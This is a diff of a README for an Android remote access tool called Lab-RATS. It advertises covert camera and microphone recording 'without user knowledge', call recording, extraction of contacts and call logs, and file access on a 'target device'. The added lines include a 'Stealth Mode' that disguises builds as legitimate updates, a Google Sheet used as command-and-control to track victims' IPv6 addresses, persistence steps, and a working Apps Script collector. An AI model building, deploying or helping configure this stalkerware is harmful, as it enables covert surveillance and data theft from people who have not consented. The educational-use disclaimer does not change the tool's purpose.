@@ -1,51 +1,149 @@
-# 🦅 K4N3CO.LABS-RAT
+# 🦅 Lab-RATS
 
 ![K4N3CO Logo](app/src/main/res/drawable/app_logo.png)
 
-Powerful and lightweight Android Remote Administration Tool (RAT) developed by **K4N3CO.LABS**. This tool allows for remote monitoring and management of Android devices through a web-based interface.
+## About
 
-## 🚀 Features
+**Powerful** and **lightweight Android Remote Administration Tool** *(RAT)* developed by **K4N3CO.LABS**. This tool allows for **remote monitoring and management** of Android devices through a **web-based interface**.
 
--   **Live Camera Streaming**: View real-time camera feed from both front and back cameras directly in your browser.
--   **Background Video Recording**: Record high-quality video in the background without user knowledge.
--   **Photo Capture**: Take instant photos from any available camera.
+---
+
+## 🚀 New Features
+
+- **Signed & Unsigned APKs**: Automatically generates both `signed.apk` (for release) and `unsigned.apk`.
+- **Advanced Identity**: Customize **App Name, Package Name** *(ID)*, and **Min SDK**.
+- **Stealth Mode**: Randomly **generates Version Name** and **Version Code** to look like **legitimate updates**.
+- **Smart Logo**:
+  - **Automatically resizes** any image to all Android densities.
+  - Optional **Transparency Generation** *(removes white backgrounds)*.
+  - Forces "**Legacy Mode**" to **bypass** adaptive icons on newer Androids.
+-   **Live Camera Streaming**: View **real-time camera feed** from both **front and back cameras** directly in your browser.
+-   **Background Video Recording**: **Record high-quality video** in the background **without** user knowledge.
+-   **Photo Capture**: Take **instant photos** from **any** available camera.
 -   **Audio Management**: 
-    -   Live Microphone Recording.
-    -   Automatic Call Recording (Incoming/Outgoing).
--   **File Manager**: Browse, download, and manage files on the internal and external storage.
+    -   **Live Microphone** Recording.
+    -   **Automatic Call** Recording *(Incoming/Outgoing)*.
+-   **File Manager**: **Browse, download, and manage files** on the internal and external storage.
 -   **Communication Logs**:
-    -   Full Call Log access.
-    -   Contact list extraction.
--   **Device Information**: Detailed system, network, hardware, and battery status.
--   **Auto-Reporting**: Automatically sends device IP and connection links to a configured Google Sheet.
+    -   **Full Call Log** access.
+    -   **Contact list** extraction.
+-   **Device Information**: **Detailed** system, network, hardware, and battery status.
+-   **Auto-Reporting**: **Automatically sends** device IP and connection links to a **configured Google Sheet**.
+
+---
+
+## Screenshots
+
+<a href='https://postimg.cc/LgdNR8qF' target='_blank'><img src='https://i.postimg.cc/LgdNR8qF/RAT-home.png' border='0' alt='RAT-home'></a> <a href="https://postimg.cc/TKyGNkXq" target="_blank"><img src="https://i.postimg.cc/TKyGNkXq/Device-info-RAT.png" alt="Device-info-RAT"></a> <a href="https://postimg.cc/cvKZkDN7" target="_blank"><img src="https://i.postimg.cc/cvKZkDN7/RAT-camera.png" alt="RAT-camera"></a> <a href="https://postimg.cc/v41M2Pdt" target="_blank"><img src="https://i.postimg.cc/v41M2Pdt/RAT-files.png" alt="RAT-files"></a> <a href='https://postimg.cc/CRpJ913r' target='_blank'><img src='https://i.postimg.cc/CRpJ913r/RAT-audio.png' border='0' alt='RAT-audio'></a>
+
+---
+
+## 🧠 Direct IPv6 Access
+
+During **security research**, a **fascinating** behavior in **modern Android networking** was discovered. When an Android device **connects to mobile data** *(and many modern WiFi networks)*, it is assigned a **Public IPv6 Address**.
+
+**Unlike** IPv4, which is **heavily NAT'd** *(Network Address Translation)* and requires **complex Port Forwarding** to access from the outside, **IPv6 addresses are often directly routeable on the public internet**.
+
+### How Lab-RATS Exploits This:
+
+1.  **Local HTTP Server**: The app starts a **lightweight HTTP server** on the Android device (Port 8080).
+2.  **The IPv6 Feature/Bug**: Because the device has a Public IPv6, **you can access this server directly from anywhere in the world** just by typing the IP address in your browser. **No router config, no firewall bypass, no NGROK**.
+3.  **The Problem** *(Dynamic IPs)*: **Mobile** networks **rotate IPs frequently**. Your **target's IP changes** every time they **reconnect**.
+4.  **The Solution** *(Google Sheet)*: We use a **simple Google Sheet** as a **"Command & Control" (C2)** tracker. The app **detects** its own **Public IPv6** and **quietly posts** it to your Google Sheet. You **open the sheet**, click the **link**, and you are connected **directly to the device**.
+
+> `**We turn the Android phone into a public web server and use Google Sheets as a dynamic phonebook to find it.**`.
+
+---
 
 ## 🛠️ Getting Started
 
 ### 1. Requirements
 -   **Java 11 or 21** installed on your PC.
--   An Android device (target).
--   A Google Sheet URL for IP reporting.
+-   An **Android** device (target).
+-   A **Google Sheet URL** for IP reporting.
 
 ### 2. Building the APK
-1.  Navigate to the `k4n3co-builder/` directory.
-2.  Run the builder script:
+1.  **Download** & **extract** the zip file.
+2.  **Navigate** to the `k4n3co-builder/` directory.
+3.  **Run** the builder script:
     -   **Windows**: Double-click `build.bat`
-    -   **Linux/Mac**: `bash build.sh`
-3.  Follow the prompts to configure:
-    -   **App Name**: (Default: K4N3CO.LABS)
+    -   **Linux/Mac**: `chmod +x build.sh` then `./build.sh`
+4.  **Follow** the prompts to configure:
+    -   **Pick** Number 1 to build `.apk`
+    -   **App Name**: (Default: Lab-RATS)
     -   **Package Name**: (Default: com.labs.k4n3co)
-    -   **Google Sheet URL**: Paste your Apps Script Web App URL.
-4.  The final APK will be generated in `k4n3co-builder/output/`.
+    -   **Google Sheet URL**: Paste your Apps Script Web App URL *(Google Sheet set-up instructions below)*.
+5.  The **final APK** will be generated in `k4n3co-builder/output/`.
 
 ### 3. Usage
-1.  Install the generated APK on the target device.
-2.  Open the app and grant all requested permissions.
-3.  Click **"Disable Battery Optimization"** to ensure background persistence.
+1.  **Install** the generated APK on the **target device**.
+2.  **Open the app** and **grant all** requested **permissions**.
+3.  Click **"Disable Battery Optimization"** to ensure background **persistence**.
 4.  Click **"Start Server"**.
-5.  The device IP will appear in your Google Sheet. Open the link to access the control panel.
-
-## ⚠️ Disclaimer
-This tool is for **educational and authorized security testing purposes only**. The developers are not responsible for any misuse or damage caused by this application. Use it responsibly.
+5.  The **device IP** will appear in your **Google Sheet**. Open the link to **access the control panel**.
 
 ---
+
+## 📊 Google Sheet Setup
+
+1. Create **Google Sheet**
+2. **Extensions** → **Apps Script**
+3. **Paste** this code:
+
+```javascript
+// Lab-RATS Remote Reporting Script
+function doPost(e) {
+  try {
+    var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
+    var data = JSON.parse(e.postData.contents);
+    
+    var timestamp = new Date();
+    var device = data.device;
+    var network = data.network;
+    var ip = data.ip;
+    var port = data.port;
+    var link = data.link;
+    
+    // Add data to the next available row
+    sheet.appendRow([timestamp, device, network, ip, port, link]);
+    
+    return ContentService.createTextOutput("Success").setMimeType(ContentService.MimeType.TEXT);
+  } catch (err) {
+    return ContentService.createTextOutput("Error: " + err.message).setMimeType(ContentService.MimeType.TEXT);
+  }
+}
+
+// Optional: Run this once to create the header row
+function setupSheet() {
+  var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
+  sheet.appendRow(["Timestamp", "Device Model", "Network Type", "IP Address", "Port", "Control Panel Link"]);
+  sheet.getRange("A1:F1").setFontWeight("bold").setBackground("#051820").setFontColor("white");
+}
+```
+4. **Deploy** → **Web App** → **Anyone**
+5. **Copy URL** → **Paste** into **builder** when asked.
+
+---
+
+## ⭐ **Support the Project**
+
+If you find **Lab-RATS** useful, **please** consider giving the project a **Star** ⭐ — it **helps** a lot!
+
+**Feel free** to **open issues** or **submit pull requests**. **Contributions** are **always welcome**!
+
+**Donations (optional but greatly appreciated):**
+
+**Bitcoin: (BTC)**
+
+```
+bc1q6lmkuju3kf7f8624fwt5qs7k5mf63mekgcnzf4
+```
+
+---
+
+## ⚠️ Disclaimer
+This tool is for **educational and authorized security testing purposes only**. The **developers are not responsible** for **ANY misuse or damage** caused by this application. **Please use it responsibly**.
+
+---
+
 © 2026 K4N3CO.LABS
